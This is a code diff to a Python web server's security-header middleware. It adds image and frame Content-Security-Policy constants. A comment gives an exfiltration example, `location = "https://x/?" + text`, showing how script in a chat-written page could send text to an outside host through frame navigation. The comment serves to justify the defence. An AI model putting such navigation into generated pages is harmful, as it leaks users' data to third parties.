@@ -72,6 +72,14 @@ def _public_hosts() -> set[str]:
 
 _ALLOWED_HOSTS = {"loopback", *_public_hosts()}
 
+# On the server, the page draws only its own images (hosted_image_policy).
+HOSTED_IMAGES = "img-src 'self' data: blob:"
+# Every frame the app draws stays on its origin. A page the chat wrote (ADR-0171)
+# runs script that can navigate its own frame, `location = "https://x/?" + text`,
+# and neither its sandbox nor its own CSP stops that: only the policy of the
+# document that holds the frame does (Chrome 156, checked 2026-11-12).
+APP_FRAMES = "frame-src 'self'"
+
 
 async def hosted_image_policy(request: Request, call_next):
     """On the server, the page draws only its own images (ADR-0098 H6): the
@@ -84,7 +92,7 @@ async def hosted_image_policy(request: Request, call_next):
 
     response = await call_next(request)
     if hosted() and "content-security-policy" not in response.headers:
-        response.headers["Content-Security-Policy"] = "img-src 'self' data: blob:"
+        response.headers["Content-Security-Policy"] = HOSTED_IMAGES
     return response
 
 
